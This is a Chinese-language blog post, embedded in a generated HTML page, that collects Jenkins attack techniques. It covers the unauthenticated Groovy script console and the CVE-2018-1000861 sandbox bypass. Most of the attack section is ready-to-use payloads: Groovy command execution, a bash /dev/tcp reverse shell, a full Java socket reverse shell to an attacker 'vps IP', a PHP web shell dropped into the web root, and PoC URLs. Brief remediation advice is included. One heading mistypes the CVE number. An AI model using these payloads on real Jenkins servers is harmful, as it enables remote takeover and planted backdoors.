@@ -1,0 +1,123 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="John Doe"><meta name="renderer" content="webkit"><meta name="copyright" content="John Doe"><meta name="keywords" content="Hexo"><meta name="description" content=""><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>Jenkins · Mr.Long's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
+  "use strict";
+  // rel=preload support test
+  if( !w.loadCSS ){
+    w.loadCSS = function(){};
+  }
+  // define on the loadCSS obj
+  var rp = loadCSS.relpreload = {};
+  // rel=preload feature support test
+  // runs once and returns a function for compat purposes
+  rp.support = (function(){
+    var ret;
+    try {
+      ret = w.document.createElement( "link" ).relList.supports( "preload" );
+    } catch (e) {
+      ret = false;
+    }
+    return function(){
+      return ret;
+    };
+  })();
+
+  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+  // then change that media back to its intended value on load
+  rp.bindMediaToggle = function( link ){
+    // remember existing media attr for ultimate state, or default to 'all'
+    var finalMedia = link.media || "all";
+
+    function enableStylesheet(){
+      link.media = finalMedia;
+    }
+
+    // bind load handlers to enable media
+    if( link.addEventListener ){
+      link.addEventListener( "load", enableStylesheet );
+    } else if( link.attachEvent ){
+      link.attachEvent( "onload", enableStylesheet );
+    }
+
+    // Set rel and non-applicable media type to start an async request
+    // note: timeout allows this to happen async to let rendering continue in IE
+    setTimeout(function(){
+      link.rel = "stylesheet";
+      link.media = "only x";
+    });
+    // also enable media after 3 seconds,
+    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+    setTimeout( enableStylesheet, 3000 );
+  };
+
+  // loop through link elements in DOM
+  rp.poly = function(){
+    // double check this to prevent external calls from running
+    if( rp.support() ){
+      return;
+    }
+    var links = w.document.getElementsByTagName( "link" );
+    for( var i = 0; i < links.length; i++ ){
+      var link = links[ i ];
+      // qualify links to those with rel=preload and as=style attrs
+      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+        // prevent rerunning on link
+        link.setAttribute( "data-loadcss", true );
+        // bind listeners to toggle media back
+        rp.bindMediaToggle( link );
+      }
+    }
+  };
+
+  // if unsupported, run the polyfill
+  if( !rp.support() ){
+    // run once at least
+    rp.poly();
+
+    // rerun poly on an interval until onload
+    var run = w.setInterval( rp.poly, 500 );
+    if( w.addEventListener ){
+      w.addEventListener( "load", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    } else if( w.attachEvent ){
+      w.attachEvent( "onload", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    }
+  }
+
+
+  // commonjs
+  if( typeof exports !== "undefined" ){
+    exports.loadCSS = loadCSS;
+  }
+  else {
+    w.loadCSS = loadCSS;
+  }
+}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><meta name="generator" content="Hexo 5.4.0"></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/cat.png"></div><!--.profile-saying
+  i.fa.fa-comment
+  .saying--><div class="cxo-profile-inner"><div class="profile-name">longlongyu</div><div class="profile-signature">for me</div><div class="friends"><div>FRIENDS</div><span><a href="//github.com/Longlongyu" target="_black">friendA</a></span><span><a href="//github.com/" target="_black">friendB</a></span><span><a href="//github.com/" target="_black">friendC</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Mr.Long's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">Jenkins</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2021-04-05</span></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h1 id="jenkins"><a href="#jenkins" class="headerlink" title="jenkins"></a>jenkins</h1><h2 id="jenkins简介"><a href="#jenkins简介" class="headerlink" title="jenkins简介"></a>jenkins简介</h2><blockquote>
+<p>&nbsp; &nbsp;Jenkins是一款开源 CI&amp;CD 软件，用于自动化各种任务，包括构建、测试和部署软件。Jenkins 支持各种运行方式，可通过系统包、Docker 或者通过一个独立的 Java 程序。<br><a target="_blank" rel="noopener" href="https://www.jenkins.io/zh/doc/">引用官方介绍，具体是什么东西我也没有专门接触过 :)</a><br><a target="_blank" rel="noopener" href="https://updates.jenkins-ci.org/download/war/">Jenkins历史版本下载</a></p>
+</blockquote>
+<h2 id="如何判断jenkins运行版本"><a href="#如何判断jenkins运行版本" class="headerlink" title="如何判断jenkins运行版本"></a>如何判断jenkins运行版本</h2><blockquote>
+<p>curl -s -I <a href="http://192.168.1.1:8080|">http://192.168.1.1:8080|</a> grep X-Jenkins</p>
+</blockquote>
+<h2 id="jenkins常见漏洞及payload"><a href="#jenkins常见漏洞及payload" class="headerlink" title="jenkins常见漏洞及payload"></a>jenkins常见漏洞及payload</h2><ul>
+<li><strong>jenkins未授权访问</strong><blockquote>
+<p>&nbsp;&nbsp; 在较老版本的Jenkins中，默认配置下所有人都可以访问平台上所有页面。攻击者可以利用平台中的scripts页面执行任意Groovy代码，获取服务器权限，进而入侵服务器，引发数据泄露等安全事件。</p>
+</blockquote>
+</li>
+</ul>
+<p><strong>漏洞修复方案：</strong></p>
+<blockquote>
+<p>在Jenkins管理页面添加访问密码。建议使用由十位以上数字，字母和特殊符号组成的强密码。<br>不要将管理后台开放到互联网上。可以使用ECS安全组策略/防火墙设置访问控制，默认策略为拒绝所有通信。可以根据业务发布情况仅开放需要对外用户提供的服务，并控制好访问源IP。<br><strong>payload：</strong><br>执行简单系统命令：<br>访问页面：<a target="_blank" rel="noopener" href="http://192.168.8.141:8080/script">http://192.168.8.141:8080/script</a><br><code>println &quot;cmd&quot;.execute().text</code><br>&nbsp;&nbsp;在收集相应攻击姿势的时候发现部分博主通过使用该方式直接直接获得了反弹shell 比如：<br><code>println “bash -i &gt;&amp; /dev/tcp/192.168.1.1/8888 0&gt;&amp;1”.execute().text</code><br>&nbsp;&nbsp;但是本人在复现的过程中未能成功反弹。<br>&nbsp;&nbsp;除了通过常规反弹shell的手段，可以通过Groovy脚本的本身特性进行反弹shell、写入文件等一系列操作。<br>反弹shell代码如下：<br><code>String host=”vps IP”; int port=8080; String cmd=”/bin/bash”; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())&#123;while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try &#123;p.exitValue();break;&#125;catch (Exception e)&#123;&#125;&#125;;p.destroy();s.close();</code><br>写入shell代码：<br><code>new File(&quot;/var/www/html/media.php&quot;).write(&#39;&lt;?php system($_GET[cmd]);?&gt;&#39;);</code></p>
+</blockquote>
+<ul>
+<li><strong>Jenkins远程命令执行漏洞（CVE-2018-100086）</strong><blockquote>
+<p>&nbsp;&nbsp;Jenkins使用Stapler框架开发，其允许用户通过URL PATH来调用一次public方法。由于这个过程没有做限制，攻击者可以构造一些特殊的PATH来执行一些敏感的Java方法。通过这个漏洞，我们可以找到很多可供利用的利用链。其中最严重的就是绕过Groovy沙盒导致未授权用户可执行任意命令：Jenkins在沙盒中执行Groovy前会先检查脚本是否有错误，检查操作是没有沙盒的，攻击者可以通过Meta-Programming的方式，在检查这个步骤时执行任意命令。<br>&nbsp;&nbsp;<a target="_blank" rel="noopener" href="https://www.securityfocus.com/bid/106176">漏洞相关信息:securityfocus</a><br>&nbsp;&nbsp;<a target="_blank" rel="noopener" href="https://www.cvedetails.com/cve/CVE-2018-1000861/">漏洞相关信息：cvedetails</a><br>&nbsp;&nbsp;该漏洞为无回显漏洞<br>POC如下：<br><code>http://your-ip:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript ?sandbox=true &amp;value=public class x &#123; public x()&#123;   &quot;touch /tmp/success&quot;.execute() &#125; &#125;</code><br>编码后的POC：<br><code>http://your-ip:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=public%20class%20x%20%7B%20public%20x()%7B%22touch%20/tmp/jenkins_AtWOLi%22.execute()%7D%7D</code><br><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2018-1000861">自动化脚本</a></p>
+</blockquote>
+</li>
+</ul>
+<p>&nbsp;&nbsp;因为刚接触攻防，实战情况下只遇到的以上两种情况，关于Jenkins的相关利用方式还有很多，以后遇到在做补充。<br>Jenkins漏洞参考：<br><a target="_blank" rel="noopener" href="https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/">台湾大手子写的Jenkins系列漏洞第一部分</a><br><a target="_blank" rel="noopener" href="https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/">台湾大手子写的Jenkins系列漏洞第二部分</a><br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1165414">腾讯云顶实验室 Jenkins文件读取漏洞</a><br><a target="_blank" rel="noopener" href="https://0xdf.gitlab.io/2019/02/27/playing-with-jenkins-rce-vulnerability.html">国外大神写的Jenkins RCE利用思路</a><br><a target="_blank" rel="noopener" href="https://medium.com/@valeriyshevchenko/jenkins-rce-poc-or-simple-pre-auth-remote-code-execution-on-the-server-d18b868a77cb">国外大神写的Jenkins RCE利用思路2</a><br><a target="_blank" rel="noopener" href="https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc">Jenkins RCE自动化脚本</a><br><a target="_blank" rel="noopener" href="https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6">借鉴</a></p>
+</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://example.com">John Doe</a></p><p> <span>Link:  </span><a href="http://example.com/2021/04/05/Jenkins/">http://example.com/2021/04/05/Jenkins/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license noopener" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="nextSlogan" href="/2021/04/05/retry-later/" title="retry-later"><span>NextPost ></span><br><span class="nextTitle">retry-later</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a target="_blank" rel="noopener" href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#jenkins"><span class="toc-number">1.</span> <span class="toc-text">jenkins</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#jenkins%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">jenkins简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%ADjenkins%E8%BF%90%E8%A1%8C%E7%89%88%E6%9C%AC"><span class="toc-number">1.2.</span> <span class="toc-text">如何判断jenkins运行版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jenkins%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%8F%8Apayload"><span class="toc-number">1.3.</span> <span class="toc-text">jenkins常见漏洞及payload</span></a></li></ol></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
